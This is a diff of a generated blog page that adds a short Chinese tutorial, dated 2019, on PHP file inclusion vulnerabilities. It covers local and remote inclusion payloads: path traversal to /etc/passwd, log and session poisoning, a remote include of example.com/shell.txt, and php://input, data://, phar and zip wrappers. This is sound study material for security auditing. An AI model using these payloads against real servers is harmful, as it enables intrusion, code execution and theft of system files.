@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>categories · K4ge&#39;s Blog</title>
+    <title>文件包含漏洞小结 · K4ge&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >K4ge&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">文件包含漏洞小结</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>K4ge's Blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            文件包含漏洞小结
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">664</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/31</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -340,15 +395,46 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>@(技术小卖铺)[代码审计]</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p>
+<ol>
+<li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li>
+<li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
+</ol>
+<p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><ol>
+<li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p>
+<p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p>
+</li>
+<li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p>
+</li>
+<li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p>
+</li>
+<li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)</p>
+</li>
+</ol>
+<h3 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h3><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p>
+<ol>
+<li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li>
+</ol>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><ol>
+<li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li>
+<li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li>
+<li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li>
+</ol>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><ol>
+<li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li>
+<li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li>
+</ol>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">Kage</a>
-            <p>原文链接：<a href="http://yoursite.com/categories/index-1.html">http://yoursite.com/categories/index-1.html</a>
-            <p>发表日期：<a href="http://yoursite.com/categories/index-1.html">February 7th 2019, 12:16:46 pm</a>
-            <p>更新日期：<a href="http://yoursite.com/categories/index-1.html">February 7th 2019, 12:16:46 pm</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/03/31/文件包含漏洞/">http://yoursite.com/2019/03/31/文件包含漏洞/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/03/31/文件包含漏洞/">三月 31日 2019, 2:38:58 下午</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/03/31/文件包含漏洞/">March 31st 2019, 2:40:16 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -358,6 +444,11 @@
             
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/02/03/hgame草稿/" title= "hgame-web-week1">
+                    <div class="prevTitle">hgame-web-week1</div>
+                </a>
             
         </li>
     </ul>
@@ -456,6 +547,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含漏洞"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地文件包含"><span class="toc-number">1.2.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地文件包含小姿势"><span class="toc-number">1.3.</span> <span class="toc-text">本地文件包含小姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-number">1.4.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪协议"><span class="toc-number">1.5.</span> <span class="toc-text">伪协议</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -610,6 +719,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
